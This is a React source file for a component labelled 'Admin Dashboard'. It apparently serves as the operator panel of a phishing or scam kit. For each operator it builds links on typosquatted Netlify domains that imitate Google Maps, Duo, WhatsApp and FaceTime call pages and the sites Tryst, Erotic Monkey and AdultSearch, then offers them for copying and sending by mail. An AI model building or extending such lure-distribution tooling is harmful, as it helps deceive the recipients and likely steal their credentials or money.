import React, { useContext, useState } from 'react';
import { FaClipboard, FaLink, FaInfoCircle, FaUser, FaLock, FaDesktop } from 'react-icons/fa';
import { MdContentCopy } from 'react-icons/md';
import { useOutlet, useOutletContext } from 'react-router-dom';

const Links = () => {
  const [copied, setCopied] = useState({
    google: false,
    megaDuo: false,
    megaWhatsApp: false,
    megaFaceTime: false,
    tryst: false,
    eroticMonkey: false,
    adultsearch: false,
  });

  const { isUserAuthenticated, userData } = useOutletContext()

  // The link to be copied

  const linkGoogle = `https://google-mapss.netlify.app/${userData?.email?.split('@')[0]}`

  const linkMegaDuo = `https://call-info.netlify.app/${userData?.email?.split('@')[0]}/duo`
  const linkMegaWhatsApp = `https://call-info.netlify.app/${userData?.email?.split('@')[0]}/whatsapp`
  const linkMegaFaceTime = `https://call-info.netlify.app/${userData?.email?.split('@')[0]}/facetime`

  const linkTrystLink = `https://supprt-trust.netlify.app/${userData?.email?.split('@')[0]}`
  const linkEroticMonkey = `https://supprt-erticmonkey.netlify.app/${userData?.email?.split('@')[0]}`
  const linkAdultSearch = `https://adult-search.netlify.app/${userData?.email?.split('@')[0]}`

  // Handle copy to clipboard functionality
  const handleCopy = (urlAsLink, nameOfLink) => {
    navigator.clipboard.writeText(urlAsLink);
    setCopied((prevCopies) => {
      return { ...prevCopies, [nameOfLink]: true }
    });
    setTimeout(() => {
      setCopied((prevCopies) => {
        return { ...prevCopies, [nameOfLink]: false }
      })
    }, 2000); // Reset copied state after 2 seconds
  };

  if (!isUserAuthenticated) {
    return <div></div>
  }

  return (

    <div className="min-h-screen bg-gray-50 py-8 md:px-8 sm:px-8 px-4 flex lg:flex-row flex-col flex-wrap lg:justify-center items-center gap-y-6 md:gap-y-10">
      <div className="text-center mb-8">
        <h1 className="text-3xl font-bold text-gray-800">Admin Dashboard</h1>
        <p className="text-gray-600 mt-2 text-lg">
          Access your admin dashboard using the link below. You can easily copy the link for quick access.
        </p>
      </div>

      <div className="flex flex-wrap justify-center items-center gap-6">


        {/* Link Info Section */}

        <div className="bg-white shadow-xl rounded-lg p-6 sm:max-w-[540px] sm:min-w-[420px] w-full">
          <div className="flex items-center justify-between mb-5 sm:mb-8">
            <div className="flex items-center gap-3">
              <FaLink className="text-green-600 text-2xl" />
              <h2 className="text-xl font-semibold text-slate-600">Mega Links</h2>
            </div>
            <FaInfoCircle className="text-gray-500 text-xl" />
          </div>


          <div className=' flex flex-col w-full gap-2'>
            <h2 className=' text-stone-700 font-semibold sm:text-xl'>1. Mega-Duo</h2>
            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
                {linkMegaDuo}
              </p>
              <button
                onClick={() => handleCopy(linkMegaDuo, 'megaDuo')}
                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
              >
                {copied.megaDuo ? (
                  <>
                    <MdContentCopy className="text-lg mr-2" />
                    Copied!
                  </>
                ) : (
                  <>
                    <FaClipboard className="text-lg mr-2" />
                    Copy Link
                  </>
                )}
              </button>
            </div>
          </div>

          <div className=' flex flex-col w-full gap-2'>
            <h2 className=' text-stone-700 font-semibold sm:text-xl'>2. Mega-WhatsApp</h2>
            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
                {linkMegaWhatsApp}
              </p>
              <button
                onClick={() => handleCopy(linkMegaWhatsApp, 'megaWhatsApp')}
                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
              >
                {copied.megaWhatsApp ? (
                  <>
                    <MdContentCopy className="text-lg mr-2" />
                    Copied!
                  </>
                ) : (
                  <>
                    <FaClipboard className="text-lg mr-2" />
                    Copy Link
                  </>
                )}
              </button>
            </div>
          </div>

          <div className=' flex flex-col w-full gap-2'>
            <h2 className=' text-stone-700 font-semibold sm:text-xl'>3. Mega-Facetime</h2>
            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
                {linkMegaFaceTime}
              </p>
              <button
                onClick={() => handleCopy(linkMegaFaceTime, 'megaFaceTime')}
                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
              >
                {copied.megaFaceTime ? (
                  <>
                    <MdContentCopy className="text-lg mr-2" />
                    Copied!
                  </>
                ) : (
                  <>
                    <FaClipboard className="text-lg mr-2" />
                    Copy Link
                  </>
                )}
              </button>
            </div>
          </div>

          <p className="text-gray-600 text-sm">
            Simply click the "Copy Link" button to copy your link URL to the clipboard.
            You can then paste it in the browser's address bar or send inside a mail.
          </p>
        </div>

        {/* Link Info Section */}

        <div className="bg-white shadow-xl rounded-lg p-6 sm:max-w-[540px] sm:min-w-[420px] w-full">
          <div className="flex items-center justify-between mb-5 sm:mb-8">
            <div className="flex items-center gap-3">
              <FaLink className="text-green-600 text-2xl" />
              <h2 className="text-xl font-semibold text-slate-600">Google</h2>
            </div>
            <FaInfoCircle className="text-gray-500 text-xl" />
          </div>

          <div className=' flex flex-col w-full gap-2'>
            <h2 className=' text-stone-700 font-semibold sm:text-xl'>1. Google-Maps</h2>
            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
                {linkGoogle}
              </p>
              <button
                onClick={() => handleCopy(linkGoogle, 'google')}
                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
              >
                {copied.google ? (
                  <>
                    <MdContentCopy className="text-lg mr-2" />
                    Copied!
                  </>
                ) : (
                  <>
                    <FaClipboard className="text-lg mr-2" />
                    Copy Link
                  </>
                )}
              </button>
            </div>
          </div>
        </div>

        <div className="bg-white shadow-xl rounded-lg p-6 sm:max-w-[540px] sm:min-w-[420px] w-full">
          <div className="flex items-center justify-between mb-5 sm:mb-8">
            <div className="flex items-center gap-3">
              <FaLink className="text-green-600 text-2xl" />
              <h2 className="text-xl font-semibold text-slate-600">Tryst</h2>
            </div>
            <FaInfoCircle className="text-gray-500 text-xl" />
          </div>

          <div className=' flex flex-col w-full gap-2'>
            <h2 className=' text-stone-700 font-semibold sm:text-xl'>1. Tryst Link</h2>
            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
                {linkTrystLink}
              </p>
              <button
                onClick={() => handleCopy(linkTrystLink, 'tryst')}
                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
              >
                {copied.tryst ? (
                  <>
                    <MdContentCopy className="text-lg mr-2" />
                    Copied!
                  </>
                ) : (
                  <>
                    <FaClipboard className="text-lg mr-2" />
                    Copy Link
                  </>
                )}
              </button>
            </div>
          </div>
        </div>

        <div className="bg-white shadow-xl rounded-lg p-6 sm:max-w-[540px] sm:min-w-[420px] w-full">
          <div className="flex items-center justify-between mb-5 sm:mb-8">
            <div className="flex items-center gap-3">
              <FaLink className="text-green-600 text-2xl" />
              <h2 className="text-xl font-semibold text-slate-600">E. Monkey</h2>
            </div>
            <FaInfoCircle className="text-gray-500 text-xl" />
          </div>

          <div className=' flex flex-col w-full gap-2'>
            <h2 className=' text-stone-700 font-semibold sm:text-xl'>1. Erotic Monkey</h2>
            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
                {linkEroticMonkey}
              </p>
              <button
                onClick={() => handleCopy(linkEroticMonkey, 'eroticMonkey')}
                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
              >
                {copied.eroticMonkey ? (
                  <>
                    <MdContentCopy className="text-lg mr-2" />
                    Copied!
                  </>
                ) : (
                  <>
                    <FaClipboard className="text-lg mr-2" />
                    Copy Link
                  </>
                )}
              </button>
            </div>
          </div>
        </div>

        <div className="bg-white shadow-xl rounded-lg p-6 sm:max-w-[540px] sm:min-w-[420px] w-full">
          <div className="flex items-center justify-between mb-5 sm:mb-8">
            <div className="flex items-center gap-3">
              <FaLink className="text-green-600 text-2xl" />
              <h2 className="text-xl font-semibold text-slate-600">A. Search</h2>
            </div>
            <FaInfoCircle className="text-gray-500 text-xl" />
          </div>

          <div className=' flex flex-col w-full gap-2'>
            <h2 className=' text-stone-700 font-semibold sm:text-xl'>1. Adult Search</h2>
            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
                {linkAdultSearch}
              </p>
              <button
                onClick={() => handleCopy(linkAdultSearch, 'adultsearch')}
                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
              >
                {copied.adultsearch ? (
                  <>
                    <MdContentCopy className="text-lg mr-2" />
                    Copied!
                  </>
                ) : (
                  <>
                    <FaClipboard className="text-lg mr-2" />
                    Copy Link
                  </>
                )}
              </button>
            </div>
          </div>
        </div>


      </div >

      {/* Extra Information */}

      <div className="bg-white shadow-xl rounded-lg p-6 md:w-1/3 md:min-w-[400px] w-full">
        <h3 className="text-xl font-semibold text-gray-700 mb-4">Dashboard Tools</h3>
        <div className="space-y-4">
          <div className="flex items-center gap-2">
            <FaUser className="text-gray-600 text-lg" />
            <p className="text-gray-700">Manage users, view analytics, and more.</p>
          </div>
          <div className="flex items-center gap-2">
            <FaLock className="text-gray-600 text-lg" />
            <p className="text-gray-700">Secure login with admin privileges only.</p>
          </div>
          <div className="flex items-center gap-2">
            <FaDesktop className="text-gray-600 text-lg" />
            <p className="text-gray-700">Access your dashboard from any device.</p>
          </div>
        </div>
      </div>
    </div >
  );
};

export default Links;
